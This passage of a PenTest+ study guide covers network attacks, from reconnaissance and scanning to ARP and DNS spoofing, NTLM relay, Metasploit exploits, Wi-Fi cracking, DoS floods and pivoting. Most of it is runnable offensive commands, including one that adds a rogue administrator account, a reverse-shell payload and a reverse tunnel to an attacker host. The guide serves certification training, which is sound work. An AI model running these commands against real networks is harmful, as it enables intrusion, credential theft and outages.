**OSPF DR/BDR:** Highest priority, then highest RID; not preemptive  
**OSPF cost:** 100Mbps / interface bandwidth  
**EIGRP metric:** (10^7/BW) + delay  
**Admin distances:** Connected=0, Static=1, EIGRP=90, OSPF=110, RIP=120  
**STP root bridge:** Lowest BID (priority + MAC)  
**STP port states (802.1D):** Blocking → Listening → Learning → Forwarding  
**HSRP:** Virtual IP; highest priority is active; Cisco proprietary  
**VRRP:** IEEE standard FHRP; real IP can be virtual IP  
**PortFast:** Skip listening/learning on access ports (use only on access!)  
**BPDU Guard:** Disable port if BPDU received (protects PortFast ports)

---
# SECTION 10: Network Attacks (PenTest+ Focus)

---

## 10.1 Network Attack Methodology

Network penetration testing follows a structured methodology. Every phase builds on the previous one, moving from information gathering to active exploitation and post-exploitation.

### Attack Phases (Network-Focused)

```
1. Reconnaissance      → Passive and active information gathering
2. Scanning            → Discover live hosts, open ports, services
3. Enumeration         → Extract detailed service/OS/user information
4. Vulnerability ID    → Match findings to known CVEs and weaknesses
5. Exploitation        → Gain initial access
6. Post-Exploitation   → Pivot, escalate, persist, exfiltrate
7. Reporting           → Document all findings with evidence
```

### Legal and Authorization

**Always obtain written authorization before testing.** Key documents:
- **Permission to Test letter** — signed by asset owner
- **Rules of Engagement (RoE)** — defines scope, techniques, timing
- **NDA** — protects confidential information discovered

---

## 10.2 Passive Reconnaissance

Gather intelligence **without touching the target network**.

### WHOIS Lookups

```bash
whois example.com           # Domain registration info
whois 203.0.113.0/24        # IP block ownership (ARIN, RIPE, APNIC)
whois -h whois.arin.net 203.0.113.1
```

WHOIS reveals: registrar, registration dates, nameservers, admin contact, organization

### DNS Reconnaissance

```bash
# Basic DNS enumeration
dig example.com ANY              # All record types
dig example.com MX               # Mail servers
dig example.com NS               # Name servers
dig example.com TXT              # TXT records (SPF, DKIM, verification tokens)
dig example.com AXFR @ns1.example.com  # Zone transfer (if misconfigured)

# Zone transfer with host
host -l example.com ns1.example.com

# Subdomain brute force
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
amass enum -d example.com -brute -w wordlist.txt
subfinder -d example.com -all
dnsx -d example.com -w wordlist.txt -a -aaaa -cname -mx

# Certificate transparency (reveals subdomains)
curl "https://crt.sh/?q=%25.example.com&output=json" | jq '.[].name_value' | sort -u
# Or visit: https://crt.sh/?q=%25.example.com

# theHarvester - multi-source OSINT
theHarvester -d example.com -b all -f output.html
theHarvester -d example.com -b google,bing,shodan,linkedin

# Fierce - DNS recon and subdomain brute force
fierce --domain example.com
fierce --domain example.com --wordlist wordlist.txt
fierce --domain example.com --dns-servers 8.8.8.8

# dnsrecon
dnsrecon -d example.com -t std          # Standard enumeration
dnsrecon -d example.com -t brt -D wordlist.txt  # Brute force
dnsrecon -d example.com -t axfr        # Zone transfer attempt
dnsrecon -r 192.168.1.0/24             # Reverse lookup on range
```

### Shodan and Network Search Engines

```bash
# Shodan CLI
shodan init YOUR_API_KEY
shodan search "org:Target Company"
shodan search "hostname:example.com"
shodan search "net:203.0.113.0/24"
shodan search "port:22 country:US"
shodan search "product:Apache httpd version:2.4.49"   # Vulnerable version
shodan host 203.0.113.10              # Full host info
shodan download output.json.gz "org:Target"
shodan parse --fields ip_str,port,hostnames output.json.gz

# Shodan dorks
ssl:"example.com"                     # SSL certs mentioning company
http.html:"Internal Portal"           # Exposed internal systems
"default password" port:80            # Default credential pages
vuln:CVE-2021-44228                   # Log4Shell vulnerable hosts
country:"US" port:3389                # Exposed RDP
"VNC" port:5900 has_screenshot:true   # VNC with screenshots

# Censys
censys search "example.com" --index hosts
censys view 203.0.113.10 --index hosts

# ZoomEye
zoomeye search "hostname:example.com"
zoomeye search "app:Apache port:8080"
```

### OSINT Framework

```bash
# Maltego (GUI) - relationship mapping
# Google dorking
site:example.com filetype:pdf            # PDFs on domain
site:example.com inurl:admin             # Admin pages
site:example.com inurl:login             # Login pages
site:example.com intitle:"index of"      # Directory listings
"example.com" ext:conf OR ext:cnf        # Config files
"example.com" ext:log                    # Log files
"example.com" ext:sql                    # Database files
"example.com" "password" filetype:txt    # Password files
inurl:vpn.example.com                    # VPN portals
"example.com" site:pastebin.com          # Data leaks on Pastebin
"example.com" site:github.com            # GitHub exposure

# Recon-ng
recon-ng
[recon-ng] > marketplace install all
[recon-ng] > workspaces create example_com
[recon-ng] > modules search hackertarget
[recon-ng] > modules load recon/domains-hosts/hackertarget
[recon-ng] > options set SOURCE example.com
[recon-ng] > run
[recon-ng] > show hosts
[recon-ng] > report html                 # Generate HTML report

# SpiderFoot - automated OSINT
spiderfoot -s example.com -t ALL -o sfout.csv
# Or web interface:
python3 sf.py -l 127.0.0.1:5001

# LinkedIn/employee enumeration
# LinkedInt, linkedin2username, CrossLinked
crosslinked -f '{f}{last}@example.com' "Example Corp"   # Generate email list
```

---

## 10.3 Active Scanning

Directly probing target systems — **requires authorization**.

### Host Discovery

```bash
# Nmap ping sweep (fastest way to find live hosts)
nmap -sn 192.168.1.0/24              # ICMP echo + TCP 80/443 + ARP (if local)
nmap -sn -PE 192.168.1.0/24         # ICMP echo only
nmap -sn -PA80,443 192.168.1.0/24   # TCP ACK ping
nmap -sn -PS22,80,443 192.168.1.0/24 # TCP SYN ping
nmap -sn --send-ip 192.168.1.0/24   # No ARP (test as router)

# Masscan - extremely fast (can do all 65535 ports on /8 in minutes)
masscan 192.168.1.0/24 -p22,80,443 --rate=1000
masscan 10.0.0.0/8 -p80 --rate=100000 --output-format grepable -oG masscan.txt

# netdiscover - ARP-based discovery (local networks)
netdiscover -r 192.168.1.0/24
netdiscover -i eth0                  # Passive (just listen for ARP)

# arp-scan (ARP at Layer 2 - very reliable on local network)
arp-scan -l                          # Scan local network
arp-scan 192.168.1.0/24
arp-scan --interface=eth0 192.168.1.0/24

# fping - parallel ping
fping -a -g 192.168.1.0/24 2>/dev/null   # Alive hosts only
fping -a -g 192.168.1.0 192.168.1.255 2>/dev/null
```

### Port Scanning

```bash
# Nmap port scanning (comprehensive reference)

# Scan types
nmap -sS 10.0.0.1                   # SYN/Stealth scan (default, requires root)
nmap -sT 10.0.0.1                   # Full TCP connect (no root needed)
nmap -sU 10.0.0.1                   # UDP scan (slow - use with -p)
nmap -sA 10.0.0.1                   # ACK scan (firewall mapping)
nmap -sW 10.0.0.1                   # Window scan (like ACK but checks window)
nmap -sN 10.0.0.1                   # Null scan (no flags)
nmap -sF 10.0.0.1                   # FIN scan
nmap -sX 10.0.0.1                   # Xmas scan (FIN+PSH+URG)
nmap -sM 10.0.0.1                   # Maimon scan (FIN+ACK)
nmap -sI zombie 10.0.0.1            # Idle/IP ID scan (uses zombie host)

# Port specification
nmap -p 22 10.0.0.1                 # Specific port
nmap -p 22,80,443 10.0.0.1         # Multiple ports
nmap -p 1-1024 10.0.0.1            # Port range
nmap -p- 10.0.0.1                  # All 65535 ports
nmap -p U:53,T:22,80 10.0.0.1     # UDP and TCP
nmap --top-ports 100 10.0.0.1      # Top 100 common ports

# Detection
nmap -sV 10.0.0.1                  # Service/version detection
nmap -sV --version-intensity 9 10.0.0.1  # Maximum version detection
nmap -O 10.0.0.1                   # OS detection (requires root)
nmap -O --osscan-guess 10.0.0.1    # Aggressive OS guessing
nmap -A 10.0.0.1                   # Aggressive (OS+version+scripts+traceroute)

# Timing (T0=slowest/stealthiest, T5=fastest/loudest)
nmap -T0 10.0.0.1                  # Paranoid (serial, 5min delay between probes)
nmap -T1 10.0.0.1                  # Sneaky (15 second delay)
nmap -T2 10.0.0.1                  # Polite (0.4 second delay)
nmap -T3 10.0.0.1                  # Normal (default)
nmap -T4 10.0.0.1                  # Aggressive (faster, good for fast networks)
nmap -T5 10.0.0.1                  # Insane (may drop accuracy)

# Evasion
nmap -f 10.0.0.1                   # Fragment packets (8-byte fragments)
nmap -f -f 10.0.0.1                # 16-byte fragments
nmap --mtu 24 10.0.0.1             # Custom fragment size
nmap -D RND:10 10.0.0.1            # Decoy scan (10 random decoys)
nmap -D 192.168.1.5,192.168.1.6,ME 10.0.0.1  # Specific decoys
nmap -S 192.168.1.100 10.0.0.1    # Spoof source IP (needs raw socket)
nmap --source-port 53 10.0.0.1    # Spoof source port
nmap --data-length 25 10.0.0.1    # Add random data to packets
nmap --randomize-hosts 10.0.0.1/24 # Randomize target order
nmap --scan-delay 500ms 10.0.0.1  # Manual delay between probes
nmap --badsum 10.0.0.1             # Send bad checksum (bypass IDS)

# NSE Scripts
nmap --script=default 10.0.0.1    # Safe default scripts
nmap --script=vuln 10.0.0.1       # Vulnerability detection
nmap --script=auth 10.0.0.1       # Authentication testing
nmap --script=brute 10.0.0.1      # Brute force
nmap --script=discovery 10.0.0.1  # Discovery scripts
nmap --script=safe 10.0.0.1       # Safe (non-destructive) scripts
nmap --script=exploit 10.0.0.1    # Exploitation scripts

# Specific useful scripts
nmap --script=http-enum 10.0.0.1                    # Web directory enum
nmap --script=http-title 192.168.1.0/24             # Grab web titles
nmap --script=smb-vuln-ms17-010 10.0.0.1           # EternalBlue
nmap --script=smb-vuln* 10.0.0.1                    # All SMB vulns
nmap --script=ssl-heartbleed 10.0.0.1              # Heartbleed
nmap --script=ssl-poodle 10.0.0.1                  # POODLE
nmap --script=ftp-anon 10.0.0.1                    # Anonymous FTP
nmap --script=ftp-brute --script-args userdb=users.txt,passdb=pass.txt 10.0.0.1
nmap --script=ssh-brute 10.0.0.1
nmap --script=ms-sql-info 10.0.0.1                 # MSSQL info
nmap --script=mysql-info 10.0.0.1                  # MySQL info
nmap --script=rdp-vuln-ms12-020 10.0.0.1           # RDP vulnerability
nmap --script=dns-zone-transfer --script-args dns-zone-transfer.domain=example.com 10.0.0.1
nmap --script=snmp-info -sU -p 161 10.0.0.1        # SNMP info
nmap --script=banner 10.0.0.1                      # Banner grabbing

# Output formats
nmap -oN normal.txt 10.0.0.1       # Normal text
nmap -oX scan.xml 10.0.0.1        # XML
nmap -oG grep.txt 10.0.0.1        # Grepable
nmap -oA all_formats 10.0.0.1     # All three
nmap -oJ json.json 10.0.0.1       # JSON (newer versions)

# Scan a list of hosts
nmap -iL targets.txt

# Real-world comprehensive scan (slow but thorough)
nmap -sS -sU -T4 -A -v -PE -PP -PS21,22,23,25,80,113,443,8080 \
     -PA80,113,443 -p- --script=default,vuln 10.0.0.1 \
     -oA full_scan
```

### Service Enumeration

```bash
# Banner grabbing
nc -nv 10.0.0.1 22               # Manual banner grab (SSH)
nc -nv 10.0.0.1 25               # SMTP banner
telnet 10.0.0.1 80               # HTTP banner
echo "" | nc -nv 10.0.0.1 443   # HTTPS (get TLS info)

curl -v http://10.0.0.1          # HTTP headers
curl -sk https://10.0.0.1        # HTTPS (skip cert check)
wget --server-response http://10.0.0.1 -O /dev/null 2>&1

# HTTP enumeration
gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://10.0.0.1 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt,html,bak
gobuster vhost -u http://example.com -w subdomains.txt   # Virtual host brute force

dirb http://10.0.0.1 /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://10.0.0.1 -w wordlist.txt --depth 3 -t 50

nikto -h http://10.0.0.1         # Web vulnerability scanner
nikto -h http://10.0.0.1 -p 8080,8443
nikto -h http://10.0.0.1 -Tuning 1    # Only file upload forms

# SMB enumeration
smbclient -L //10.0.0.1 -N       # List shares (null auth)
smbclient //10.0.0.1/share -N    # Connect to share (null auth)
smbclient //10.0.0.1/share -U admin%password

enum4linux -a 10.0.0.1           # Comprehensive SMB enum
enum4linux-ng -A 10.0.0.1 -oA output

nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.0.0.1
nmap -p 445 --script=smb-os-discovery 10.0.0.1
nmap -p 445 --script=smb-security-mode 10.0.0.1

crackmapexec smb 10.0.0.0/24     # SMB sweep
crackmapexec smb 10.0.0.1 --shares
crackmapexec smb 10.0.0.1 -u admin -p password --shares

# SNMP enumeration
snmpwalk -v2c -c public 10.0.0.1            # Walk full MIB
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.1  # System info
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.2.1.25.6.3.1.2  # Installed software
snmpwalk -v2c -c public 10.0.0.1 1.3.6.1.4.1.77.1.2.25   # Windows users

onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.0.0.1
snmp-check 10.0.0.1 -c public    # SNMP check tool

# LDAP enumeration
ldapsearch -x -h 10.0.0.1 -b "dc=example,dc=com"
ldapsearch -x -h 10.0.0.1 -b "dc=example,dc=com" "(objectClass=*)"
ldapsearch -x -h 10.0.0.1 -b "dc=example,dc=com" -D "cn=admin" -w password "(uid=*)"
ldapdomaindump 10.0.0.1 -u 'DOMAIN\user' -p password

# RPC enumeration
rpcclient -U "" 10.0.0.1 -N      # Null session
rpcclient -U "admin%password" 10.0.0.1
rpcclient> enumdomusers          # List domain users
rpcclient> enumdomgroups         # List domain groups
rpcclient> queryuser 0x3e8       # User info by RID
rpcclient> netshareenum         # List shares
rpcclient> getdompwinfo         # Password policy

# FTP enumeration
ftp 10.0.0.1
ftp> anonymous (empty password)  # Try anonymous login
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor 10.0.0.1

# SSH enumeration
nmap -p 22 --script=ssh-auth-methods --script-args ssh.user=root 10.0.0.1
nmap -p 22 --script=ssh2-enum-algos 10.0.0.1   # Supported algorithms
```

---

## 10.4 Network-Level Attacks

### ARP Poisoning / ARP Spoofing

**Goal:** Position attacker between two hosts (Man-in-the-Middle)

**How it works:**
1. Host A has: IP_B → MAC_B in ARP cache
2. Attacker sends gratuitous ARP: "IP_B is at MAC_Attacker"
3. Host A updates: IP_B → MAC_Attacker
4. Traffic from A to B now goes to attacker
5. Attacker forwards to B (transparent MITM)

```bash
# arpspoof (dsniff package)
echo 1 > /proc/sys/net/ipv4/ip_forward    # Enable IP forwarding (required for MITM)

arpspoof -i eth0 -t 192.168.1.100 192.168.1.1   # Tell victim: "gateway is me"
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   # Tell gateway: "victim is me"
# Run both simultaneously in separate terminals

# Bettercap (modern, more powerful)
bettercap -iface eth0
>> net.probe on                           # Discover hosts
>> net.show                               # Show discovered hosts
>> set arp.spoof.targets 192.168.1.100   # Set targets
>> arp.spoof on                           # Enable ARP poisoning
>> net.sniff on                           # Start sniffing
>> set net.sniff.filter tcp port 80      # Filter for HTTP

# Ettercap
ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//
# -T = text mode, -M = MITM mode, arp:remote = ARP poisoning

# With SSL stripping
ettercap -T -M arp:remote -P sslstrip /192.168.1.100// /192.168.1.1//

# ARP poisoning detection
arp -a                                    # View ARP cache
# Look for: same MAC for two different IPs = poisoning
arpwatch                                  # Daemon that monitors ARP changes
```

### DNS Spoofing / DNS Cache Poisoning

**Goal:** Redirect victim's DNS queries to attacker-controlled IP

```bash
# With Bettercap DNS spoofer
bettercap -iface eth0
>> set dns.spoof.domains *.example.com,targetbank.com
>> set dns.spoof.address 192.168.1.50    # Attacker's IP (fake server)
>> dns.spoof on
>> arp.spoof on                           # Also poison ARP for MITM position

# With Ettercap DNS plugin
# Edit /etc/ettercap/etter.dns:
# *.example.com  A  192.168.1.50
# www.targetbank.com  A  192.168.1.50

ettercap -T -M arp:remote -P dns_spoof /192.168.1.100// /192.168.1.1//

# Responder - capture NBNS/LLMNR/mDNS (Windows name resolution)
# When victim tries to resolve a name that fails DNS, Windows broadcasts LLMNR/NBNS
# Responder poisons those requests

responder -I eth0 -rdwv
# -r = Respond to NBNS queries for workstation and server types
# -d = Respond to DHCP broadcast
# -w = WPAD rogue proxy server
# -v = Verbose

# Captured hashes appear as:
# [SMB] NTLMv2 Hash: DOMAIN\user::DOMAIN:challenge:hash
```

### SSL Stripping

**Goal:** Downgrade HTTPS to HTTP so attacker can read traffic

```bash
# sslstrip (combined with ARP poisoning MITM)
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

sslstrip -l 8080 -w sslstrip.log
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# sslstrip2 / bettercap handles modern HSTS bypass attempts

# HSTS (HTTP Strict Transport Security) largely defeats sslstrip
# If site has HSTS: browser will refuse to downgrade to HTTP
```

### VLAN Hopping

**Goal:** Access traffic on VLANs you're not supposed to be on

**Method 1: Switch Spoofing**
- Attacker sends DTP (Dynamic Trunking Protocol) frames
- Tricks switch into forming a trunk with the attacker
- Attacker now receives all VLAN traffic

```bash
# yersinia - Layer 2 attack tool
yersinia dtp -attack 1    # Enable trunking (send DTP frames)
yersinia -G               # GTK GUI mode
```

**Method 2: Double Tagging**
- Only works when attacker is on native VLAN
- Send frame with two 802.1Q tags: outer = native VLAN, inner = target VLAN
- Switch removes outer tag (native VLAN untagged), forwards inner-tagged frame to trunk
- Second switch sees inner tag, delivers to target VLAN

**Prevention:**
- Change native VLAN to unused VLAN (not VLAN 1)
- Tag native VLAN explicitly
- Disable DTP: `switchport nonegotiate`
- Manually set trunk/access: `switchport mode access` or `switchport mode trunk`

### DHCP Attacks

**DHCP Starvation:**
- Attacker requests all available IP addresses using spoofed MACs
- Exhausts DHCP pool → legitimate clients can't get IPs
```bash
# DHCPig
pig.py eth0
# Yersinia
yersinia dhcp -attack 1   # DHCP discover flood
```

**Rogue DHCP Server:**
- After starvation or separately, attacker runs DHCP server
- Assigns attacker's IP as gateway/DNS → full MITM

```bash
# dnsmasq as rogue DHCP
dnsmasq --interface=eth0 --dhcp-range=192.168.1.100,192.168.1.200 \
        --dhcp-option=3,192.168.1.50 --dhcp-option=6,192.168.1.50

# Or use metasploit
msf > use auxiliary/server/dhcp
msf auxiliary(dhcp) > set SRVHOST 0.0.0.0
msf auxiliary(dhcp) > set SUBNET 192.168.1.0
msf auxiliary(dhcp) > set NETMASK 255.255.255.0
msf auxiliary(dhcp) > set ROUTER 192.168.1.50
msf auxiliary(dhcp) > set DNSSERVER 192.168.1.50
msf auxiliary(dhcp) > run
```

### STP Attacks

**Root Bridge Attack:**
- Attacker sends BPDUs with low bridge priority
- Becomes root bridge → all traffic passes through attacker

```bash
# yersinia STP attack
yersinia stp -attack 4    # Claiming root role

# Bettercap
bettercap > set stp.attack.kind root-bridge
bettercap > stp.attack on
```

**Prevention:**
- Enable BPDU Guard on access ports
- Enable Root Guard on designated ports
- Enable STP PortFast only on access ports

### IPv6 Attacks

**SLAAC / Router Advertisement Attacks (Router Advertisement Guard attacks):**
```bash
# fake_router6 - send rogue RA (router advertisement)
fake_router6 eth0 2001:db8::/64

# THC-IPv6 toolkit
fake_router26 eth0              # More complex RA attack
flood_router6 eth0              # Flood with router advertisements
```

**NDP Spoofing (IPv6 equivalent of ARP poisoning):**
```bash
parasite6 eth0                  # NDP poisoning tool (THC-IPv6)
```

### Network Denial of Service

> ⚠️ **For authorized testing only. DoS against production systems without permission is illegal.**

**Flood attacks:**
```bash
# hping3 - versatile packet crafting
hping3 -S --flood -p 80 target.com          # SYN flood
hping3 -1 --flood target.com                # ICMP flood
hping3 -2 --flood -p 53 target.com         # UDP flood
hping3 -S -p 80 -c 10000 --rand-source target.com  # SYN flood random source

# ICMP flood
ping -f -s 65000 target.com                 # Ping flood with large packets

# Slowloris - slow HTTP attack (keeps connections open)
slowloris target.com -p 80 -s 1000 --sleeptime 15
# Exhausts web server connection pool with slow partial requests
```

**DNS Amplification (theory):**
- Attacker sends DNS queries with spoofed victim source IP
- Small query (40 bytes) → large response (4000 bytes) = 100x amplification
- Response goes to victim IP
- Prevention: BCP38 (ingress filtering prevents IP spoofing)

---

## 10.5 Credential Attacks on Network Services

### NTLM Relay Attacks

**NTLMv2 Capture with Responder:**
```bash
responder -I eth0 -rdwv

# Captured hash format (crack offline):
# Domain\User::DOMAIN:Challenge:NTProofStr:NTResponse
hashcat -m 5600 ntlmv2.txt rockyou.txt     # Crack NTLMv2

# Or relay instead of capture:
impacket-ntlmrelayx -tf targets.txt -smb2support
# When victim authenticates to responder, relay to targets.txt
# If target has SMB signing disabled, we get shell
```

**NTLM Relay for Remote Code Execution:**
```bash
# Disable capturing, enable relay mode
responder -I eth0 -rdwv --lm    # Disable HTTP/SMB servers in Responder
impacket-ntlmrelayx -tf smb-targets.txt -smb2support -i  # Interactive shell
impacket-ntlmrelayx -tf smb-targets.txt -smb2support -c "net user hacker Pass123 /add && net localgroup administrators hacker /add"
```

### Brute Force and Password Spraying

```bash
# Hydra - online brute force
hydra -l admin -P rockyou.txt ssh://10.0.0.1
hydra -L users.txt -P passwords.txt ftp://10.0.0.1
hydra -l admin -P pass.txt 10.0.0.1 http-post-form "/login:user=^USER^&pass=^PASS^:Login failed"
hydra -l admin -P pass.txt 10.0.0.1 http-get "/admin/"
hydra -L users.txt -p Winter2024! rdp://10.0.0.1    # Password spray RDP
hydra -L users.txt -p Password123 smb://10.0.0.1   # Password spray SMB

# Medusa
medusa -h 10.0.0.1 -u admin -P rockyou.txt -M ssh
medusa -H hosts.txt -U users.txt -P pass.txt -M smb

# CrackMapExec (CME/cme) - Swiss army knife
crackmapexec smb 10.0.0.0/24 -u admin -p password            # Spray network
crackmapexec smb 10.0.0.0/24 -u users.txt -p passwords.txt   # Spray with lists
crackmapexec smb 10.0.0.0/24 --local-auth -u admin -p password # Local auth
crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Password1'     # Spray single pass
crackmapexec winrm 10.0.0.1 -u admin -p password             # WinRM
crackmapexec ssh 10.0.0.0/24 -u admin -p password            # SSH

# Kerbrute - Kerberos username enumeration and brute force
kerbrute userenum -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.0.0.1
kerbrute bruteuser -d domain.local rockyou.txt admin --dc 10.0.0.1
kerbrute passwordspray -d domain.local users.txt 'Password1' --dc 10.0.0.1

# Password spraying timing (avoid lockouts)
# Typical policy: 5 attempts, 30-minute lockout
# Safe spray interval: 1 attempt every 30-60 minutes
```

### Network Service Exploitation

```bash
# Metasploit auxiliary scanners
msf > use auxiliary/scanner/ssh/ssh_login
msf > set RHOSTS 10.0.0.0/24
msf > set USER_FILE users.txt
msf > set PASS_FILE passwords.txt
msf > set THREADS 10
msf > run

msf > use auxiliary/scanner/smb/smb_login
msf > set SMBUser administrator
msf > set PASS_FILE passwords.txt

msf > use auxiliary/scanner/ftp/ftp_login
msf > use auxiliary/scanner/telnet/telnet_login
msf > use auxiliary/scanner/mssql/mssql_login
msf > use auxiliary/scanner/mysql/mysql_login
msf > use auxiliary/scanner/rdp/rdp_scanner

# EternalBlue (MS17-010 / CVE-2017-0144) - SMBv1 vulnerability
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 10.0.0.5
msf > set LHOST 10.0.0.1
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > run

# BlueKeep (CVE-2019-0708) - RDP vulnerability
msf > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf > set RHOSTS 10.0.0.5

# Log4Shell (CVE-2021-44228)
msf > use exploit/multi/handler
# Or use a standalone PoC
```

---

## 10.6 Wireless Network Attacks

### Wi-Fi Attack Toolkit Setup

```bash
# Put wireless interface into monitor mode
airmon-ng check kill             # Kill interfering processes
airmon-ng start wlan0           # Start monitor mode → creates wlan0mon
iwconfig wlan0mon               # Verify monitor mode

# Alternative (iw)
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

### Wireless Reconnaissance

```bash
# Scan for networks
airodump-ng wlan0mon            # Scan all channels
airodump-ng -c 6 wlan0mon      # Scan specific channel
airodump-ng --band abg wlan0mon # Scan 2.4 and 5 GHz

# Output:
# BSSID              PWR  Beacons  #Data  CH  MB   ENC  AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -65    500    1234   6   54   WPA2  PSK   TargetNetwork

# Save capture
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Kismet - more powerful Wi-Fi scanner
kismet -c wlan0mon

# WiFi Analyzer tools
iwlist wlan0 scan | grep -E "ESSID|Quality|Encryption"
```

### WPA2 Handshake Capture and Crack

```bash
# Step 1: Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
# Wait for client to connect/reconnect, OR:

# Step 2: Deauthenticate client (forces reconnect → handshake captured)
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan0mon
# -a = AP MAC, -c = Client MAC (or omit to deauth all clients)
# Watch airodump-ng for "WPA handshake: AA:BB:CC:DD:EE:FF"

# Step 3: Crack offline
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# GPU crack with Hashcat (much faster!)
# Convert cap to hashcat format
hcxpcapngtool -o handshake.hc22000 handshake-01.cap
# Or: cap2hashcat (older method)
aircrack-ng handshake-01.cap -J hashcat_format

hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt -r rules/best64.rule
hashcat -m 22000 handshake.hc22000 -a 3 ?u?l?l?l?d?d?d?d    # Mask attack
```

### PMKID Attack (No Deauth Required)

```bash
# Capture PMKID from first EAPOL frame
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=3
# Wait 30-60 seconds, then Ctrl+C

# Convert and crack
hcxpcapngtool capture.pcapng -o pmkid.hc22000
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

### Evil Twin / Rogue AP Attack

```bash
# Create fake AP matching legitimate one
airbase-ng -e "TargetNetwork" -c 6 wlan0mon    # Basic evil twin

# Advanced: hostapd-wpe (wireless pwnage edition)
# Intercept WPA2-Enterprise credentials (PEAP/EAP-TTLS)
hostapd-wpe wpe.conf
# Config file specifies SSID, channel, EAP type to impersonate
# Captured EAP credentials appear in terminal

# WiFi Pineapple (hardware + software platform)
# Karma attack: respond to all probe requests (any SSID)
# Clients searching for any remembered network → connect to pineapple
```

### WPS Attacks

```bash
# Scan for WPS-enabled APs
wash -i wlan0mon                # Show WPS-enabled networks
wash -i wlan0mon -C             # Ignore FCS errors

# Reaver - WPS PIN brute force
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv --no-associate   # Don't auto-associate
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345678          # Try specific PIN

# Pixie dust attack (offline crack of weak WPS implementations)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vv              # Pixie dust mode
bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3                 # Bully with pixie dust
```

### Bluetooth Attacks

```bash
# Bluetooth discovery
hciconfig hci0 up
hcitool scan                     # Classic Bluetooth scan
hcitool lescan                   # Bluetooth Low Energy scan

# Bluediving - Bluetooth security suite
bluediving

# btlejuice / gattacker - BLE MITM
# ubertooth - hardware for Bluetooth monitoring

# bluesnarf - unauthorized Bluetooth file access
obexftp -b TARGET_MAC -B 1 -g phonebook.vcf   # Bluesnarfing attempt

# l2ping - Bluetooth ping (DDoS)
l2ping -i hci0 -s 600 -f TARGET_MAC           # Bluetooth flood

# BTScanner
btscanner
```

---

## 10.7 Post-Exploitation Networking

### Network Discovery from Compromised Host

```bash
# Find more targets
ifconfig / ip addr                        # What networks am I on?
netstat -rn / ip route                   # Routing table
arp -a                                   # ARP cache (other hosts on same segment)
cat /etc/hosts                           # Static entries
nmap 192.168.1.0/24 -sn                 # Ping sweep from pivot

# Windows
ipconfig /all
route print
arp -a
net view                                 # Windows network resources
net view /domain                         # List domains
nltest /dclist:DOMAIN                   # Find domain controllers
nslookup -type=srv _ldap._tcp.DOMAIN   # Find DCs via DNS

# Port scanning from pivot (using tools already on system)
for i in {1..254}; do ping -c1 -W1 192.168.2.$i | grep "bytes from" & done

# Scanning through Meterpreter
meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24
meterpreter > run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0/24 PORTS=22,80,443,445,3389
```

### Pivoting and Tunneling

```bash
# SSH port forwarding (tunnel through compromised host)
# Local forward: reach internal host through pivot
ssh -L 3389:192.168.2.10:3389 user@pivot.host      # Forward local 3389 to internal host
ssh -L 8080:192.168.2.20:80 user@pivot.host        # Forward local 8080 to internal web
# Now: connect to localhost:3389 to reach 192.168.2.10:3389

# Dynamic SOCKS proxy (proxy all tools through SSH)
ssh -D 1080 user@pivot.host                         # SOCKS5 proxy on port 1080
proxychains nmap -sT -p 80,443 192.168.2.0/24      # Scan through proxy
proxychains firefox                                  # Browse through proxy

# Remote forward (expose internal service to external)
ssh -R 4444:localhost:4444 user@external.server     # Forward external 4444 to our local 4444

# Chisel - HTTP tunnel (when only port 80/443 is allowed)
# On attacker:
./chisel server -p 8080 --reverse

# On pivot:
./chisel client attacker_ip:8080 R:socks            # SOCKS proxy back through HTTP

# SSHuttle - VPN over SSH
sshuttle -r user@pivot.host 192.168.2.0/24          # Route all traffic to subnet

# Meterpreter pivoting
meterpreter > run post/multi/manage/autoroute        # Auto-add routes
meterpreter > background
msf > route add 192.168.2.0/24 [session_id]
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 192.168.2.0/24

# Port forwarding in Meterpreter
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.2.10

# proxychains configuration (/etc/proxychains4.conf)
# socks5 127.0.0.1 1080
# socks4 127.0.0.1 9050
